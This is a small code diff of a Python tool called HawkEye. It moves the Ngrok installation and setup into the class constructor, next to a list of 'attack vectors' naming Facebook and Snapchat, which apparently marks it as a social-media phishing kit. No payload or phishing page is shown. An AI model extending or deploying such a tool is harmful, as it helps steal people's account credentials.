@@ -9,6 +9,14 @@ class HawkEye(object):
 
     def __init__(self):
         
+        print('Importing Ngrok Extension...')
+        self.ngrok_app = Ngrok()
+        print('Checking Ngrok Installation...')
+        if not bool(self.ngrok_app.installed): 
+            print('No Ngrok installation detected, installing...')
+            self.ngrok_app.install_ngrok()
+
+        
         self.attack_vectors = (
             'Facebook',
             'Snapchat',
@@ -110,12 +118,6 @@ class HawkEye(object):
 
 
 if __name__ == '__main__':
-
-    print('Importing Ngrok Extension...')
-    ngrok_app = Ngrok()
-    print('Checking Ngrok Installation...')
-    if not bool(ngrok_app.installed): 
-        print('No Ngrok installation detected, installing...')
-        ngrok_app.install_ngrok()
+    
     hawkeye_app = HawkEye()
     hawkeye_app.generate_menu()
